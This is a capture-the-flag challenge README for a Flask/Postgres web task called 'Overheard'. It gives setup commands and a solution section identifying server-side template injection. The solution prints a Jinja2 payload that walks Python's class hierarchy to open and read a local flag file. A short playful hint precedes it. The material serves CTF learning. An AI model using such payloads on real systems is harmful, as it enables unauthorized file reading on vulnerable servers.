# Overheard

## Problem Description (Shared)

Hi!

9/10 doctors recommend using Dettol since it kills 99.99% of the bacteria.
I personally prefer using a sanitizer since no water is needed.

\<link to the question was provided here \>

## Setup

After setting up a postgres database just start the server by                               
```sh
$ FLASK_APP=server.py python2.7 -m flask run --port <port>
```

Now, go to *http://localhost:<port>*

## Solution

This is a template injection problem.
You can read about it online, one good link is [this](https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/).

The solution for the problem is -> **{{ {{ ''.__class__.__mro__[2].__subclasses__()[40]('./flag').read()  }} }}**.
Write the above in the text box.
